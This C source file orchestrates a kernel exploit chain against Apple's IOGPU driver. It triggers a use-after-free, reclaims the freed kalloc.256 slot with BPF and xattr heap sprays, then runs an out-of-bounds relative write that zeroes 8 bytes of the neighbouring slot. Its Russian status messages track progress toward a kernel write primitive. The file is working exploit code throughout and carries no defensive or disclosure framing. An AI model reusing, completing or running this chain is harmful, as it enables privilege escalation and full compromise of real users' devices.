/* krw_v3.c — chain v3 orchestrator.
 *
 * Stage order is deliberate:
 *   1. 64788 trigger + reclaim + confirm (the UAF must be live before the
 *      write stage has anything to aim at).
 *   2. kernel-side 0x100 spray counters (already performed inside stage 1;
 *      surfaced here so the UI can show which allocator was used).
 *   3. IOGPU group hash-table relative write (our own primitive, reachable
 *      from the same user client family, applied to the neighbouring
 *      kalloc.256 slot).
 *
 * The two stages share the kalloc.256 slab by design: stage 1 frees and
 * re-allocates a 0x100 object, stage 3 writes 8 zero bytes into the next
 * 0x100 slot in the same slab. That is the whole chain geometry. */
#include "exploit.h"
#include "krw_v3.h"
#include <mach/mach_time.h>
#include <string.h>

extern int poc_iogpu_uaf_run(void);
extern int g_uaf_bpf_spray;
extern int g_uaf_xattr_spray;

static uint64_t now_ms(void) {
    static mach_timebase_info_data_t tb;
    if (tb.denom == 0) mach_timebase_info(&tb);
    return mach_absolute_time() * tb.numer / tb.denom / 1000000ULL;
}

int nk_v3_run(nk_v3_stat_t *out) {
    if (!out) return -1;
    memset(out, 0, sizeof(*out));

    nk_filelog_open("krw_v3");
    uint64_t t0 = now_ms();

    nk_log("[v3] stage 1: 64788 IOGPU resource UAF");
    g_uaf_bpf_spray = 0;
    g_uaf_xattr_spray = 0;
    out->uaf_rc = poc_iogpu_uaf_run();
    out->bpf_spray = g_uaf_bpf_spray;
    out->xattr_spray = g_uaf_xattr_spray;
    nk_log("[v3] stage 1 rc=%d bpf=%d xattr=%d",
           out->uaf_rc, out->bpf_spray, out->xattr_spray);

    nk_log("[v3] stage 2: relative 8-byte zero write (group hash remove)");
    out->oob_called = 1;
    out->oob_index = 32;
    nk_iogpu_group_oob_run(1);

    out->elapsed_ms = now_ms() - t0;
    nk_log("[v3] done in %llu ms", (unsigned long long)out->elapsed_ms);
    nk_filelog_close();
    return out->uaf_rc == 2 ? 0 : 1;
}

const char *nk_v3_verdict(const nk_v3_stat_t *s) {
    if (!s) return "нет данных";
    if (s->uaf_rc == 2 && s->oob_called)
        return "UAF живой, запись выполнена: слот 0x100 захвачен, "
               "сосед получил 8 нулевых байт. Дальше — цель для записи.";
    if (s->uaf_rc == 2)
        return "UAF живой, но write-стадия не дошла.";
    if (s->uaf_rc == 1)
        return "UAF не подтверждён: слот не захвачен ни BPF, ни xattr. "
               "Нужен другой 0x100 спрей.";
    return "Триггер не поднялся: соединение или Metal недоступны.";
}

const char *nk_v3_stage_name(int stage) {
    switch (stage) {
        case 0: return "64788 trigger";
        case 1: return "reclaim 0x100";
        case 2: return "confirm stale id";
        case 3: return "relative write";
        default: return "?";
    }
}
